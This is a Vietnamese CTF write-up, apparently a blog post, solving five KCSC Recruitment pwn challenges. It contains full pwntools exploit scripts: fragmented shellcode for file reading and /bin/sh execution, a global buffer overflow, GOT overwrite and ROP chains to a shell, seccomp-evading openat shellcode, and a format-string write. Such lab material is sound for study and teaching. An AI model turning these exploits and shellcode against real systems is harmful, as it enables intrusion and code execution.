---
title: KCSC-Recruitment
date: 2025-02-12 00:00:00 +0800
categories: [KCSC-Recruitment]
tags: [pwn]
author: "kuvee"
layout: post
published: false
---

## chodan

- nhìn vào ta thấy chuỗi "your shellcode" nên sẽ đoán đây là 1 bài dùng shellcode , ta sẽ được input 0x100 bytes vào sc này , tiếp theo nó đóng ```stdin``` 
- vòng loop này sẽ duyệt qua 16 bytes mỗi lần lặp và 8 bytes ở sau sẽ được set thành null



```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char *s; // [rsp+8h] [rbp-8h]

  setup(argc, argv, envp);
  printf("Your shellcode: ");
  read(0, code, 0x100uLL);
  close(0);
  for ( s = (char *)code + 8; s + 8 < (char *)code + 256; s += 16 )
    memset(s, 0, 8uLL);
  ((void (__fastcall *)(__int64, __int64, void *, __int64))code)(3405691582LL, 0xCCACAAAAACLL, code, 52428LL);
  return 0;
}
```

- cuối cùng là xóa dữ liệu của các ```register```

```asm
mov     rax, 0DEDEDEDEh
mov     rdi, 0CAFEBABEh
mov     rdx, 0DCDCDCDCh
mov     rbx, 0AAAAAAAAAAh
mov     rcx, 0CCCCh
mov     rsi, 0CCACAAAAACh
mov     rdx, cs:code
mov     eax, 0
call    rdx ; code
```

- ta có thể thấy khi ta nhập 1 nùi byte thì nó sẽ set null ở shellcode+(i*8) và bài này seccomp cũng không được thiết lập

```cs
gef> x/20xg 0x00007ffff7fbc000
0x7ffff7fbc000: 0x6161616161617363      0x0000000000000000
0x7ffff7fbc010: 0x6161616161616161      0x0000000000000000
0x7ffff7fbc020: 0x0000000000000000      0x0000000000000000
0x7ffff7fbc030: 0x0000000000000000      0x0000000000000000
0x7ffff7fbc040: 0x0000000000000000      0x0000000000000000
0x7ffff7fbc050: 0x0000000000000000      0x0000000000000000
0x7ffff7fbc060: 0x0000000000000000      0x0000000000000000
0x7ffff7fbc070: 0x0000000000000000      0x0000000000000000
0x7ffff7fbc080: 0x0000000000000000      0x0000000000000000
```

- ý tưởng của ta có lẽ là dùng lệnh jmp , ta có thể jmp đoạn thứ nhất sang đoạn thứ 2 và ...

- ta sẽ dùng lable để jmp đến lệnh tiếp theo của shellcode , và lệnh jmp trong trường hợp này là 2 bytes 

```cs
0:  48 c7 c0 03 00 00 00    mov    rax,0x3
7:  eb f7                   jmp    0 <_main>
```

- ta sẽ sử dụng web này để tính số byte [here](https://defuse.ca/online-x86-assembler.htm) và debug để chỉnh sửa cho đúng


- ở đây mình đã open thành công với path là ```./flag.txt``` , tuy nhiên nó trả về ```fd``` là 0 , tại sao lại như vậy?  thì đơn giản là ta đã đóng fd của ```stdin``` nên giờ fd 0 còn trống nên thằng open sẽ lấy nó
![here](/assets/images/opensc.png)

- open thành công rồi thì việc còn lại là read , write , tuy nhiên thì shellcode của mình dùng hơi nhiều bytes nên mình sẽ đổi lại path ngắn hơn :))) ở đề cho là /flag thôi

![here](/assets/images/orw.png)


exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chodan',checksec=False)
context.arch = 'amd64'
p = process()

sc = asm(
        '''
    sc1:
        push 26465
        nop
        jmp sc2
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc2:
        pop rbx
        push 1818636078
        jmp sc3
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc3:
        pop r9
        shl rbx,32
        jmp sc4
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc4:
        or rbx,r9
        nop
        nop
        nop
        jmp sc5
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc5:
        push rbx
        mov rdi,rsp
        nop
        nop
        jmp sc6
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop

    sc6:
        xor rsi,rsi
        xor rdx,rdx
        jmp sc7
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc7:
        add rax,2
        syscall
        jmp sc8
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc8:
        mov rdi,rax
        nop
        nop
        nop
        jmp sc9
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc9:
        mov rsi,rcx
        nop
        nop
        nop
        jmp sc10
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc10:
        xor rdx,0x50
        syscall
        jmp sc11
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc11:
        add rdi,1
        nop
        nop
        jmp sc12
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
    sc12:
        xor rax,0x12
        nop
        nop
        syscall








         ''')
input()
p.sendafter(b'shellcode: ',sc)



p.interactive()
```

- cách 2 sẽ là get_shell , vì ở đây ```stdin``` đóng nên ta cần mở nó lại mới lấy được flag , nhưng ta cần biết là  khi đóng ```stdin``` thì dù mở lại cũng không hoạt động ở local nhưng remote thì lại được  , vì ở local ```stdin``` và ```stdout``` ```stderr``` sẽ là 3 thằng khác nhau và hoàn toàn riêng biệt , nhưng khi nc tới sever thì cả 3 th đó sẽ tạo 1 đường hầm và đi chung với nhau , muốn hiểu rõ thì xem video của a Trí <3 [here](https://www.youtube.com/watch?v=swIAzpok96Y&t=2s)

- vậy ta sẽ viết shellcode thực thi ```dup2(0,1)``` và ```execve('/bin/sh',0,0)```


- và chắc chắn khi input ở local thì nó sẽ bị lỗi 

![here](/assets/images/stdin.png)

- vậy ta sẽ phải build docker mới có thể thành công lấy shell , tuy nhiên mình lười nên thôi để script ở đây :v

exp: 

```cs
from pwn import *

context.binary = exe = ELF('./chodan',checksec=False)
context.arch = 'amd64'
p = process()

sc = asm('''
         sc1:
            xor rsi,rsi
            xor rdi,rdi
            jmp sc2
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
         sc2:
            add rdi,1
            nop
            nop
            jmp sc3
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
         sc3:
            xor rax,0x21
            syscall
            jmp sc4
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
         sc4:
            push 6845231
            nop
            jmp sc5
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
         sc5:
            pop r9
            xor rax,0x3b
            jmp sc6
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
        sc6:
            push 1852400175
            nop
            jmp sc7
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
        sc7:
            pop r10
            shl r9,0x20
            jmp sc8
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
        sc8:
            or r9,r10
            push r9
            nop
            jmp sc9
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
        sc9:
            mov rdi,rsp
            xor rdx,rdx
            syscall












         ''')
input()
p.sendafter(b'shellcode: ',sc)



p.interactive()
```

## AAA

- 1 bài khá ngắn , ta cũng thấy rõ target ở đây là change giá trị của ```is_admin```  , ở bài này ```buf``` và ```is_admin``` sẽ là 2 biến global -> ta có thể overflow biến ```buf``` và thay đổi giá trị của ```is_admin```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setup(argc, argv, envp);
  printf("Input: ");
  gets(buf);
  printf("Your input: %s\n", buf);
  if ( is_admin )
    system("cat /flag");
  return 0;
}
```

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./main',checksec=False)

p =process()

payload = b'a'*0x100
payload += p64(1)
p.sendline(payload)

p.interactive()
```

## babyROP

- bài này cũng khá ngắn , ta thấy ở đây có 1 ```bof``` rất rõ ràng , nhưng tiếp theo nó check payload của ta bằng strlen() và điều này hoàn toàn có thể bypass bằng byte NULL , ta cần nhớ là fgets nhận input đến n-1 bytes hoặc 1 newline hoặc 1 EOF , ta hoàn toàn có thể thêm bytes NULL vào payload để vượt qua được đoạn check 


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  setup(argc, argv, envp);
  puts("Welcome to KCSC Recruitment !!!");
  printf("Data: ");
  fgets(s, 4919, stdin);
  if ( strlen(s) > 0x40 )
  {
    puts("Buffer overflow ??? No way.");
    exit(0);
  }
  puts("Thank for playing :)");
  return 0;
}
```

- có khá nhiều cách để làm bài này , ta có thể dùng pivot để change got thành 1 hàm khác , ví dụ như ta có thể thay đổi ```strlen@got``` để khiến nó trở thành ```puts@got``` hoặc là ```printf@got``` , và vì ```strlen``` chỉ nhận 1 đối số và đối số đó ta cũng có thể control được nên ta có thể thay đổi ```buf``` đó thành 1 địa chỉ got hoặc là 1 chuỗi định dạng để leak được libc
- 1 cách khác là thay đổi ```strlen@got``` thành 1 gadget ở main : 

ta sẽ nói sau về cách này 

![here](/assets/images/changegot.png)


- tiếp theo là 1 cách trigger ```(fun)lockfile``` , khi ```printf``` được gọi thì nó sẽ trả về 1 địa chỉ trỏ đến ```funlockfile``` và ta hoàn toàn có thể gọi ```puts``` 1 lần nữa để leak libc và đây có lẽ là cách dễ nhất  

![here](/assets/images/funlock.png)


### cách 1 : change got -> gadget main 

- ý tưởng là ta sẽ change got@puts thành 1 chuỗi định dạng và got@strlen sẽ là gadget này: 

```cs
0x000000000040126a <+47>:    mov    eax,0x0
0x000000000040126f <+52>:    call   0x4010b0 <printf@plt>
0x0000000000401274 <+57>:    mov    rdx,QWORD PTR [rip+0x2df5]        # 0x404070 <stdin@GLIBC_2.2.5>
0x000000000040127b <+64>:    lea    rax,[rbp-0x40]
0x000000000040127f <+68>:    mov    esi,0x1337
0x0000000000401284 <+73>:    mov    rdi,rax
0x0000000000401287 <+76>:    call   0x4010c0 <fgets@plt>
0x000000000040128c <+81>:    lea    rax,[rbp-0x40]
0x0000000000401290 <+85>:    mov    rdi,rax
0x0000000000401293 <+88>:    call   0x4010a0 <strlen@plt>
```

- khi fgets thì ta sẽ nhập vào puts@got và nó sẽ ở rax , và sau lệnh fgets ta thấy nó sẽ ```mov rdi,rax``` trước khi vào ```strlen@got``` và nó sẽ gọi printf với chuõi định dạng là ```puts@got``` mà ta đã setup  -> leak libc thành công
- sau khi leak thành công nó sẽ tiếp tục dùng fgets để input vào ```puts@got```  , ta sẽ thay đổi nó thành chuỗi /bin/sh và ```strlen@got``` thành system để lấy shell


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
puts = 0x0000000000401258
gets = 0x0000000000401274
payload = b'\x00'
payload = payload.ljust(64,b'a')
payload += p64(exe.got.puts+0x40)
payload += p64(0x00000000004012cc) + p64(gets)

input()
p.sendlineafter(b'Data: ',payload)
print(hex(exe.plt.printf))
p1 = b'%p%p%p%p'
p1 += p64(0x000000000040126a)  #main
p1 += p64(0x401050)
p1 += p64(0x401060)
p1 += p64(0x401070)
p1 += p64(0x401080)
input()
p.sendline(p1)

p.recvuntil(b'Thank for playing :)\n')
libc.address = int(p.recv(14),16) -  0x21ab23
log.info(f'libc: {hex(libc.address)}')

input()
p.sendline(b'/bin/sh\x00' + p64(libc.sym.system))
p.interactive()
```

![here](/assets/images/kcscflag.png)

### cách 2 : trigger (fun)lockfile

- vì cách này không có gì để nói nên mình để script thôi :<

exp: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
puts = 0x0000000000401258
gets = 0x0000000000401274
payload = b'\x00'
payload = payload.ljust(64,b'a')
payload += p64(0)
payload += p64(0x00000000004012cc) + p64(exe.plt.printf) + p64(exe.plt.puts) + p64(exe.sym.main)

input()
p.sendlineafter(b'Data: ',payload)
p.recvuntil(b'Thank for playing :)\n')
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x62050
log.info(f'libc: {hex(libc.address)}')
pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi  = libc.address + 0x000000000016333a
pop_rdx_rcx_rbx = 0x0000000000108b03 + libc.address
og = 0xebc88 + libc.address  # rsi,rdx null  rbp writeable
pl_get_shell = flat(
        'a'*64,
        0x405000-0x100,
        pop_rsi,
        0,
        pop_rdx_rcx_rbx,
        0,
        0,
        0,
        og,
        )
p.sendline(pl_get_shell)
p.interactive()
```

- cách cuối pivot khi nào mình rảnh sẽ add vô :))


## ccrash 

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/KCSC_Recruitment/ccrash/ccrash$ checksec main
[*] '/home/ploi/pwn/KCSC_Recruitment/ccrash/ccrash/main'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- chương trình sẽ in địa chỉ stack ```result``` và địa chỉ exe ```trace``` cho ta , tiếp theo ta cũng có 1 bug ```bof``` , ta có thể overwrite ```saved_rip``` của main


```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char result[1024]; // [rsp+0h] [rbp-400h] BYREF

  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  setup();
  puts("Test::Test: Assertion 'false' failed!");
  puts("Callstack:");
  printf("dbg::handle_assert(214) in mylib.dll %p: Test::Test(9) in mylib.dll\n", result);
  printf("myfunc(10) in TestStackTrace %p: main(23) in TestStackTrace\n", trace);
  puts("invoke_main(65) in TestStackTrace");
  puts("_scrt_common_main_seh(253) in TestStackTrace ");
  puts("OK");
  read(0, result, 0x410uLL);
  return 0;
}
```

- nhìn vào hàm setup có lẽ là nó dùng seccomp để hạn chế ta lấy shell

```c
void __cdecl setup()
{
  scmp_filter_ctx ctx; // [rsp+0h] [rbp-20h]
  size_t page_size; // [rsp+18h] [rbp-8h]
  __int64 savedregs; // [rsp+20h] [rbp+0h] BYREF

  page_size = sysconf(30);
  mprotect((void *)(-(__int64)page_size & (unsigned __int64)&savedregs), page_size, 7);
  ctx = (scmp_filter_ctx)seccomp_init(2147418112LL);
  if ( ctx )
  {
    if ( (int)seccomp_rule_add(ctx, 327681LL, 59LL, 0LL) < 0 || (int)seccomp_rule_add(ctx, 327681LL, 322LL, 0LL) < 0 )
    {
      perror("seccomp_rule_add (execve) failed");
      seccomp_release(ctx);
    }
    else if ( (int)seccomp_rule_add(ctx, 327681LL, 2LL, 0LL) >= 0 )
    {
      if ( (int)seccomp_load(ctx) < 0 )
      {
        perror("seccomp_load failed");
        seccomp_release(ctx);
      }
    }
    else
    {
      perror("seccomp_rule_add (open) failed");
      seccomp_release(ctx);
    }
  }
  else
  {
    perror("seccomp_init failed");
  }
}
```

- ta có thể dùng ```seccomp-tools``` để check : 

ở đây nó filter ```open , execve , execveat``` vì vậy còn rất nhiều các syscall khác có thể hoạt động

```c
ploi@PhuocLoiiiii:~/pwn/KCSC_Recruitment/ccrash/ccrash$ seccomp-tools dump ./main
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

- ta sẽ dùng ```openat``` + ```read``` + ```write``` ở bài này và vì có địa chỉ stack nên đây sẽ là 1 bài ret2shellcode: 

exp: 

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./main',checksec=False)
context.arch = 'amd64'

p = process()

sc = asm('''
         mov rdi,-100
         push 29816
         movabs r9,8371742425456455470
         push r9
         xor rsi,rsi
         xor rdx,rdx
         xor r10,r10
         mov rsi,rsp
         mov rax,0x101
         syscall
         mov rdi,rax
         xor rax,rax
         mov rdx,0x50
         mov rsi,rsp
         syscall
         mov rdi,1
         mov rax,1
         syscall
         ''')

p.recvuntil(b'mylib.dll ')
stack = int(p.recvuntil(b':')[:-1],16)
p.recvuntil(b'TestStackTrace ')
log.info(f'stack: {hex(stack)}')

payload = b'\x90' * (0x400-len(sc))
payload += sc
payload += p64(0) + p64(stack)
input()
p.send(payload)

p.interactive()
```

## welcome 

- 1 bài fsb warmup

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  setup(argc, argv, envp);
  puts("Welcome to KCSC Recruitment !");
  printf("What's your name?\n> ");
  fgets(s, 64, stdin);
  printf("Hi ");
  printf(s);
  if ( key == 4919 )
    win();
  return 0;
}
```

exp: 

```python
#!/usr/bin/python3

from pwn import *


context.binary = exe = ELF('./chall',checksec=False)
context.arch = 'amd64'

p = process()

key = 0x000000000040408C

payload = f'%{4919}c%8$hn'.encode()
payload = payload.ljust(16,b'a')
payload += p64(key)
p.sendline(payload)
p.interactive()
```